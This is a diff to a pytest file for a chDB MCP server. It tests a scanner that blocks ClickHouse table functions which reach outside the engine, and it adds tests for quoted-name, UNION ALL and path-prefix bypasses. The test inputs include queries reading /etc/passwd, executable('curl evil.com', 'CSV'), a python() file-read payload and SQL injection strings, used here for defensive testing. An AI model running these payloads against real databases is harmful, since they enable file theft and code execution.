@@ -1,4 +1,4 @@
-"""Smoke tests for the v0.1 tools and the v0.1.1 hardening fixes.
+"""Smoke tests for the tools and hardening fixes.
 
 These import the tool functions directly (FastMCP keeps the decorated function
 callable as a plain Python function), so we exercise the same code path the
@@ -23,11 +23,40 @@ from chdb_mcp.server import (
     query_file,
 )
 from chdb_mcp.utils import (
-    find_external_source_calls,
+    SAFE_TABLE_FUNCTIONS,
+    find_disallowed_table_function_calls,
     quote_ident,
     quote_string,
     truncate,
 )
+
+# A representative "known" set for the unit tests: every external-reach
+# table function we want to catch, plus a couple of safe ones to confirm
+# the safe-set still passes through. Real callers pass the dynamic snapshot
+# from system.table_functions; this fixture keeps the unit tests deterministic.
+_TEST_KNOWN = frozenset(
+    {
+        "file",
+        "filecluster",
+        "url",
+        "s3",
+        "remote",
+        "executable",
+        "python",
+        "cosn",
+        "oss",
+        "iceberg",
+        "icebergs3",
+        "paimon",
+        "ytsaurus",
+        # Safe ones, included so scanner can confirm it skips them.
+        "numbers",
+        "values",
+        "view",
+        "merge",
+    }
+)
+
 
 # --------------------------------------------------------------------------- #
 # Pure utilities (no chDB needed)
@@ -57,70 +86,138 @@ def test_quote_string_escapes_single_quotes() -> None:
     assert quote_string("o'brien") == "'o''brien'"
 
 
-def test_find_external_source_calls_detects_common_table_fns() -> None:
+def test_quote_string_escapes_backslash_before_quote() -> None:
+    """ClickHouse honours `\\'` as a quote escape; the wrapper must escape
+    backslashes too or a payload `x\\'` could close the literal."""
+    assert quote_string("x\\'") == "'x\\\\'''"
+    assert quote_string("a\\b") == "'a\\\\b'"
+    assert quote_string("o'brien") == "'o''brien'"
+
+
+def test_safe_table_functions_includes_common_safe_ones() -> None:
+    """Tripwire: if someone drops one of these from the safe set, every
+    `SELECT * FROM numbers(10)` style call under an allowlist breaks."""
+    for name in ("numbers", "values", "view", "merge", "dictionary", "generaterandom"):
+        assert name in SAFE_TABLE_FUNCTIONS
+
+
+def test_scanner_flags_external_sources() -> None:
     sql = (
         "SELECT * FROM file('/etc/passwd', 'LineAsString') "
         "JOIN s3('s3://b/x.parquet') USING (k) "
         "WHERE k IN (SELECT id FROM remote('host', 'db.t'))"
     )
-    assert find_external_source_calls(sql) == ["file", "remote", "s3"]
+    assert find_disallowed_table_function_calls(sql, _TEST_KNOWN) == ["file", "remote", "s3"]
 
 
-def test_find_external_source_calls_is_case_insensitive() -> None:
-    assert find_external_source_calls("SELECT FILE('x','CSV')") == ["file"]
-    assert find_external_source_calls("SELECT URL('h')") == ["url"]
+def test_scanner_is_case_insensitive() -> None:
+    assert find_disallowed_table_function_calls("SELECT FILE('x','CSV')", _TEST_KNOWN) == ["file"]
+    assert find_disallowed_table_function_calls("SELECT URL('h')", _TEST_KNOWN) == ["url"]
 
 
-def test_find_external_source_calls_ignores_comments_and_strings() -> None:
-    # In a string literal: must not trigger.
-    assert find_external_source_calls("SELECT 's3(\\'x\\')' AS s") == []
-    # In a line comment.
-    assert find_external_source_calls("SELECT 1 -- file('/x')\nFROM t") == []
-    # In a block comment.
-    assert find_external_source_calls("SELECT /* url('x') */ 1") == []
+def test_scanner_ignores_strings_and_comments() -> None:
+    assert find_disallowed_table_function_calls("SELECT 's3(\\'x\\')' AS s", _TEST_KNOWN) == []
+    assert find_disallowed_table_function_calls("SELECT 1 -- file('/x')\nFROM t", _TEST_KNOWN) == []
+    assert find_disallowed_table_function_calls("SELECT /* url('x') */ 1", _TEST_KNOWN) == []
 
 
-def test_find_external_source_calls_does_not_match_substring() -> None:
-    # `filename` and `s3hash` should not match because of word boundary.
-    assert find_external_source_calls("SELECT filename(x), s3hash(y) FROM t") == []
+def test_scanner_does_not_match_substring() -> None:
+    # `filename` and `s3hash` aren't in the known set, so they're ignored
+    # regardless of word-boundary behavior.
+    assert (
+        find_disallowed_table_function_calls("SELECT filename(x), s3hash(y) FROM t", _TEST_KNOWN)
+        == []
+    )
 
 
-def test_find_external_source_calls_resists_comment_smuggling() -> None:
-    """A string containing `/*` before the real call and another containing
-    `*/` after it would, under the v0.1.1 order (strip-comments-then-mask-
-    strings), erase the file() call between them. The single-pass mask must
-    consume each string fully before any comment rule fires."""
+def test_scanner_resists_comment_smuggling() -> None:
+    """A pair of strings containing `/*` and `*/` around a real call could,
+    under naive comment-then-string masking, erase the call. The single-pass
+    mask must consume each construct atomically."""
     sql = "SELECT '/*' AS a, file('/etc/passwd', 'LineAsString'), '*/' AS b"
-    assert find_external_source_calls(sql) == ["file"]
+    assert find_disallowed_table_function_calls(sql, _TEST_KNOWN) == ["file"]
 
 
-def test_find_external_source_calls_handles_string_with_quote_inside_comment() -> None:
-    """A stray `'` inside a comment must not mis-pair with later quotes and
-    swallow the real file() call. Comment is consumed atomically."""
+def test_scanner_handles_quote_inside_comment() -> None:
+    """A `'` inside a comment must not mis-pair with later quotes and swallow
+    the real file() call."""
     sql = "SELECT 1 -- it's a test\nFROM file('/data/x.parquet', 'Parquet')"
-    assert find_external_source_calls(sql) == ["file"]
+    assert find_disallowed_table_function_calls(sql, _TEST_KNOWN) == ["file"]
 
 
-def test_find_external_source_calls_handles_backslash_quote_in_string() -> None:
-    """ClickHouse's `\\'` escape: the string content really is `s3(`, but the
-    function-call regex must NOT match it because it's inside a (now masked)
-    string literal."""
-    # The Python literal here is: SELECT '\'s3(' AS s, NOT a real s3() call.
-    assert find_external_source_calls("SELECT '\\'s3(' AS s") == []
+def test_scanner_handles_backslash_quote_in_string() -> None:
+    """ClickHouse's `\\'` escape: the s3( is inside a string literal, so the
+    function-call regex must NOT match it."""
+    assert find_disallowed_table_function_calls("SELECT '\\'s3(' AS s", _TEST_KNOWN) == []
 
 
-def test_quote_string_escapes_backslash_before_quote() -> None:
-    """ClickHouse honours `\\'` as a quote escape inside string literals. If we
-    only doubled the `'`, a payload `x\\'; …` would close the literal and run
-    the rest as SQL. Confirm the wrapper escapes backslashes too."""
-    # Input value (Python repr): x\'
-    # Without backslash escaping: 'x\''  → ClickHouse parses as string `x'`,
-    # leaving the trailing chars as bare SQL.
-    # With backslash escaping: 'x\\\''  → ClickHouse parses as string `x\'`.
-    assert quote_string("x\\'") == "'x\\\\'''"
-    assert quote_string("a\\b") == "'a\\\\b'"
-    # SQL-standard double-quote still works.
-    assert quote_string("o'brien") == "'o''brien'"
+def test_scanner_normalizes_backtick_quoted_function_name() -> None:
+    """P0-2 attack vector: chDB accepts `file`(...) as a call. The scanner
+    strips matched backtick pairs around \\w+ before matching."""
+    assert find_disallowed_table_function_calls(
+        "SELECT * FROM `file`('/etc/passwd', 'LineAsString')", _TEST_KNOWN
+    ) == ["file"]
+    assert find_disallowed_table_function_calls("SELECT * FROM `s3`('s3://b/x')", _TEST_KNOWN) == [
+        "s3"
+    ]
+
+
+def test_scanner_normalizes_double_quoted_function_name() -> None:
+    """P0-2 attack vector: chDB also accepts \"file\"(...). Same treatment as
+    backticks."""
+    assert find_disallowed_table_function_calls(
+        "SELECT * FROM \"file\"('/etc/passwd', 'LineAsString')", _TEST_KNOWN
+    ) == ["file"]
+
+
+def test_scanner_flags_rce_class_table_functions() -> None:
+    """`executable` and `python` are RCE primitives in chDB — running a shell
+    command / arbitrary Python in-process. They must be detected as not-safe
+    just like file()/url()."""
+    assert find_disallowed_table_function_calls(
+        "SELECT * FROM executable('curl evil.com', 'CSV')", _TEST_KNOWN
+    ) == ["executable"]
+    assert find_disallowed_table_function_calls(
+        "SELECT * FROM python('print(open(\"/etc/passwd\").read())')", _TEST_KNOWN
+    ) == ["python"]
+
+
+def test_scanner_flags_cluster_variants() -> None:
+    """fileCluster / urlCluster etc. are full table functions in chDB 26.3 —
+    they reach outside just like their non-cluster siblings."""
+    assert find_disallowed_table_function_calls(
+        "SELECT * FROM fileCluster('cluster', '/etc/passwd', 'LineAsString')", _TEST_KNOWN
+    ) == ["filecluster"]
+
+
+def test_scanner_lets_safe_table_functions_through() -> None:
+    """Scalar / generator / in-engine table functions must pass even when
+    the allowlist is configured."""
+    assert (
+        find_disallowed_table_function_calls(
+            "SELECT * FROM numbers(10) UNION ALL SELECT * FROM values('x UInt8', 1)",
+            _TEST_KNOWN,
+        )
+        == []
+    )
+    # view() can wrap arbitrary SQL but the text-level scanner sees inside.
+    assert find_disallowed_table_function_calls("SELECT * FROM view(SELECT 1)", _TEST_KNOWN) == []
+    # view() containing a non-safe call is still flagged via the inner token.
+    assert find_disallowed_table_function_calls(
+        "SELECT * FROM view(SELECT * FROM file('/etc/passwd', 'CSV'))", _TEST_KNOWN
+    ) == ["file"]
+
+
+def test_scanner_ignores_unknown_table_functions() -> None:
+    """If chDB removes/renames a function so it's no longer in the known set,
+    the scanner stops flagging it. This is the "stay in sync with engine"
+    property — the alternative (hand-maintained denylist) silently goes
+    stale."""
+    # `madeupfn` is not in _TEST_KNOWN.
+    assert (
+        find_disallowed_table_function_calls("SELECT * FROM madeupfn('whatever')", _TEST_KNOWN)
+        == []
+    )
 
 
 # --------------------------------------------------------------------------- #
@@ -135,11 +232,7 @@ def test_query_returns_value() -> None:
 
 
 def test_writes_are_blocked_by_default() -> None:
-    """README's main safety claim: `SET readonly=2` is applied at session start.
-
-    Guards against silent regressions where someone removes the readonly guard
-    in _get_session() but agent-driven writes start silently succeeding.
-    """
+    """README's main safety claim: `SET readonly=2` is applied at session start."""
     with pytest.raises(RuntimeError, match=r"readonly"):
         query("CREATE TABLE default.should_not_exist (a Int32) ENGINE=Memory")
 
@@ -147,16 +240,10 @@ def test_writes_are_blocked_by_default() -> None:
 def test_run_truncates_output_at_max_result_bytes(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """Confirm `_run()` actually applies `truncate(_, _CONFIG.max_result_bytes)`.
-
-    Guards against a regression where someone refactors `_run()` and silently
-    drops the `truncate()` call — the unit tests of `truncate()` itself would
-    still pass, but the MCP channel would receive unbounded payloads.
-    """
+    """Confirm `_run()` actually applies `truncate(_, _CONFIG.max_result_bytes)`."""
     from chdb_mcp import server
     from chdb_mcp.config import Config
 
-    # Tight 200-byte limit; a 100-row JSONCompact output is ~700 bytes — well over.
     tiny = Config(
         readonly=True,
         max_result_bytes=200,
@@ -168,7 +255,6 @@ def test_run_truncates_output_at_max_result_bytes(
 
     out = query("SELECT number FROM system.numbers LIMIT 100", "JSONCompact")
     assert "truncated at 200 bytes" in out
-    # Trimmed body (≤200 B) + truncation notice (~80 B); total well under 400 B.
     assert len(out.encode("utf-8")) < 400
 
 
@@ -179,32 +265,25 @@ def test_list_databases_includes_system() -> None:
 
 def test_list_tables_system_nonempty() -> None:
     out = list_tables("system")
-    # The `system` database always exposes at least the `tables` and `numbers`
-    # virtual tables; one of them is plenty for a smoke check.
     assert "tables" in out or "numbers" in out
 
 
 def test_list_tables_rejects_identifier_injection() -> None:
-    """Confirm quote_ident is wired into list_tables (not just unit-tested in isolation)."""
     with pytest.raises(ValueError, match=r"invalid SQL identifier"):
         list_tables("foo; DROP TABLE bar")
 
 
 def test_describe_table_returns_columns() -> None:
     out = describe_table("system", "one")
-    # system.one has a single UInt8 column named `dummy`.
     assert "dummy" in out
 
 
 def test_get_sample_data_respects_limit() -> None:
     out = get_sample_data("system", "numbers", limit=3)
-    # JSONCompact wraps rows in an array of arrays; ensure at least three
-    # row separators or three digits appear.
     assert out.count("\n") >= 1
 
 
 def test_get_sample_data_clamps_huge_limit() -> None:
-    # limit=999999 should be silently clamped to 1000 and not crash.
     out = get_sample_data("system", "numbers", limit=999_999)
     assert isinstance(out, str)
 
@@ -217,25 +296,20 @@ def test_query_file_requires_placeholder() -> None:
 def test_check_path_resolves_allowlist_symlinks(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """/tmp prefix must match /tmp/x even when /tmp is a symlink (macOS case)."""
     from chdb_mcp import server
 
-    # Pin the allowlist to a resolved /tmp and confirm a /tmp path is accepted.
     resolved_tmp = str(Path("/tmp").resolve())
     monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
-    # Should not raise — even if path was given as the symlink form.
     server._check_path("/tmp/some_file.parquet")
 
 
 def test_check_path_rejects_sibling_prefix_attack(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """Allowlist /tmp must NOT match /tmp_evil/x via naive startswith."""
     from chdb_mcp import server
 
     resolved_tmp = str(Path("/tmp").resolve())
     monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
-    # /tmp_evil resolves to /private/tmp_evil; that must NOT start with /private/tmp/.
     with pytest.raises(ValueError, match=r"not under any prefix"):
         server._check_path("/tmp_evil/x.parquet")
 
@@ -265,37 +339,127 @@ def test_query_file_counts_rows_from_csv() -> None:
 
 
 # --------------------------------------------------------------------------- #
-# Hardening fixes (v0.1.1)
+# Allowlist gating (post-review hardening)
 # --------------------------------------------------------------------------- #
 
 
 def test_query_rejects_external_sources_when_allowlist_set(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """The README documents CHDB_MCP_FILE_ALLOWLIST as a filesystem isolation
-    knob, but a raw query() with file()/url()/s3() would bypass it. With the
-    allowlist set, those table functions must be rejected before chDB sees them.
-    """
+    """Raw query() with file()/s3()/remote() must be rejected when the
+    allowlist is configured."""
     from chdb_mcp import server
 
     monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
-    with pytest.raises(ValueError, match=r"external table functions"):
+    with pytest.raises(ValueError, match=r"non-safe table functions"):
         query("SELECT count() FROM file('/etc/passwd', 'LineAsString')")
-    with pytest.raises(ValueError, match=r"external table functions"):
+    with pytest.raises(ValueError, match=r"non-safe table functions"):
         query("SELECT * FROM s3('s3://bucket/x.parquet')")
-    with pytest.raises(ValueError, match=r"external table functions"):
+    with pytest.raises(ValueError, match=r"non-safe table functions"):
         query("SELECT 1 FROM remote('host', 'db.t')")
+
+
+def test_query_rejects_quoted_function_name_bypass(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """P0-2: backtick- and double-quoted function names previously bypassed
+    the scanner because the regex only matched bare identifiers."""
+    from chdb_mcp import server
+
+    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
+    with pytest.raises(ValueError, match=r"non-safe table functions"):
+        query("SELECT count() FROM `file`('/etc/passwd', 'LineAsString')")
+    with pytest.raises(ValueError, match=r"non-safe table functions"):
+        query("SELECT count() FROM \"file\"('/etc/passwd', 'LineAsString')")
+
+
+def test_query_rejects_rce_class_table_functions(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """`executable` and `python` were missing from the v0.1.1 denylist entirely;
+    confirm the dynamic allowlist catches them."""
+    from chdb_mcp import server
+
+    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
+    with pytest.raises(ValueError, match=r"non-safe table functions"):
+        query("SELECT * FROM executable('id', 'CSV')")
+
+
+def test_query_file_rejects_extra_external_calls_in_user_sql(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """P0-1: the UNION ALL bypass. query_file's path check gates the
+    placeholder, but the user's surrounding SQL could attach a second
+    file()/url()/etc. call. Scanner now runs on the user SQL before
+    substitution."""
+    from chdb_mcp import server
+
+    # _RESOLVED_ALLOWLIST must hold paths in their symlink-resolved form, the
+    # same form _check_path() compares against. On macOS /tmp resolves to
+    # /private/tmp, so writing a literal "/tmp" here would make the path
+    # check fail first and the assertion below would catch the wrong error.
+    resolved_tmp = str(Path("/tmp").resolve())
+    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
+    with tempfile.NamedTemporaryFile("w", suffix=".csv", dir=resolved_tmp, delete=False) as fh:
+        fh.write("a\n1\n2\n")
+        benign = fh.name
+    try:
+        with pytest.raises(ValueError, match=r"non-safe table functions"):
+            query_file(
+                path=benign,
+                sql=(
+                    "SELECT count() FROM {file} UNION ALL "
+                    "SELECT count() FROM file('/etc/passwd', 'LineAsString')"
+                ),
+                format="CSV",
+            )
+    finally:
+        os.unlink(benign)
+
+
+def test_query_file_normal_use_still_works_with_allowlist(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A plain query_file with just `{file}` must still succeed under allowlist —
+    no false positives on the placeholder."""
+    from chdb_mcp import server
+
+    resolved_tmp = str(Path("/tmp").resolve())
+    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", (resolved_tmp,))
+    with tempfile.NamedTemporaryFile("w", suffix=".csv", dir=resolved_tmp, delete=False) as fh:
+        fh.write("a\n1\n2\n3\n")
+        path = fh.name
+    try:
+        out = query_file(
+            path=path,
+            sql="SELECT count() FROM {file}",
+            format="CSVWithNames",
+        )
+        assert "3" in out
+    finally:
+        os.unlink(path)
+
+
+def test_query_allows_safe_table_functions_when_allowlist_set(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """numbers(), values(), view() etc. are safe-by-construction and must
+    pass even with the allowlist on."""
+    from chdb_mcp import server
+
+    monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ("/tmp",))
+    out = query("SELECT count() FROM numbers(10)")
+    assert "10" in out
 
 
 def test_query_allows_external_sources_when_allowlist_empty(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """When the user has not configured the allowlist, query() preserves the v0.1
-    behavior of accepting any SQL (the README's documented default)."""
+    """When the allowlist is unset, query() accepts any SQL (the README's
+    documented default — host process owns the boundary)."""
     from chdb_mcp import server
 
     monkeypatch.setattr(server, "_RESOLVED_ALLOWLIST", ())
-    # file() against a real path under /tmp should still succeed.
     with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as fh:
         fh.write("a\n1\n2\n")
         p = fh.name
@@ -307,32 +471,20 @@ def test_query_allows_external_sources_when_allowlist_empty(
 
 
 def test_max_result_bytes_actually_caps_engine_output() -> None:
-    """v0.1 advertised CHDB_MCP_MAX_RESULT_BYTES but only string-truncated after
-    chDB materialized the full result; large queries hit chDB's internal memory
-    limit first. v0.1.1 sets max_block_size + max_result_bytes + break so the
-    engine itself caps output."""
     from chdb_mcp import server
 
-    # We can't easily re-init the session with a different cap mid-test, so
-    # we validate via a >>budget query and check the output is bounded.
     out = query(
         "SELECT randomPrintableASCII(100) FROM numbers(50000)",
         format="CSV",
     )
-    # The session cap defaults to 1 MiB. Without the fix this is ~5 MiB; with
-    # the fix it should sit at or below the cap + one block overshoot.
     cap = server._CONFIG.max_result_bytes
-    assert len(out.encode("utf-8")) <= cap + 64 * 1024, (
-        f"output {len(out.encode('utf-8'))} bytes exceeds cap {cap} by more "
-        f"than one block (~64 KiB)"
-    )
+    assert len(out.encode("utf-8")) <= cap + 64 * 1024
 
 
 def test_list_functions_includes_well_known_names() -> None:
     out = list_functions()
-    # Headers row + at least these aggregate / scalar functions.
     assert "name\tis_aggregate" in out
-    assert "\nsum\t" in out or "\nsum\n" in out  # tab-separated
+    assert "\nsum\t" in out or "\nsum\n" in out
     assert "\ncount\t" in out or "\ncount\n" in out
 
 
@@ -341,21 +493,15 @@ def test_list_functions_substring_filter_narrows_results() -> None:
     quantile_only = list_functions(pattern="quantile")
     assert len(quantile_only) < len(all_fns)
     assert "quantile" in quantile_only.lower()
-    # The header row plus at least one match.
     assert quantile_only.count("\n") >= 2
 
 
 def test_list_functions_pattern_escapes_quotes() -> None:
-    """Confirm the pattern arg is quote_string-escaped; SQL injection here
-    would be a real bug because the user supplies the pattern directly."""
-    # A pattern with a single quote must not break the SQL.
     out = list_functions(pattern="x'; DROP TABLE y; --")
-    # No match expected, but no error either — header row only.
     assert "name\tis_aggregate" in out
 
 
 def test_server_module_advertises_version_and_name() -> None:
-    """Guard against future FastMCP changes that drop the name/version patch."""
     from chdb_mcp import __version__, server
 
     assert server.mcp._mcp_server.name == "chdb-mcp"
@@ -363,9 +509,6 @@ def test_server_module_advertises_version_and_name() -> None:
 
 
 def test_empty_resources_and_prompts_capabilities_are_not_advertised() -> None:
-    """We register no resources/prompts; removing the auto-registered list
-    handlers prevents an empty `resources` / `prompts` map showing in the
-    InitializeResult capability set."""
     from mcp.server.lowlevel.server import NotificationOptions
 
     from chdb_mcp import server
@@ -373,5 +516,20 @@ def test_empty_resources_and_prompts_capabilities_are_not_advertised() -> None:
     caps = server.mcp._mcp_server.get_capabilities(NotificationOptions(), {})
     assert caps.prompts is None
     assert caps.resources is None
-    # tools is still announced — we have tools.
     assert caps.tools is not None
+
+
+def test_known_table_functions_populated_from_system_catalog() -> None:
+    """Session init queries system.table_functions and caches the lowercase
+    name set so the scanner stays in sync with the running engine."""
+    from chdb_mcp import server
+
+    # Force session init.
+    server._get_session()
+    # chDB 26.x has many — exact count drifts; sanity-check ≥ 30 and that
+    # known-dangerous names are in there.
+    assert len(server._KNOWN_TABLE_FUNCTIONS) >= 30
+    for name in ("file", "url", "s3", "remote", "executable", "python"):
+        assert name in server._KNOWN_TABLE_FUNCTIONS, name
+    for name in ("numbers", "values", "view", "merge"):
+        assert name in server._KNOWN_TABLE_FUNCTIONS, name
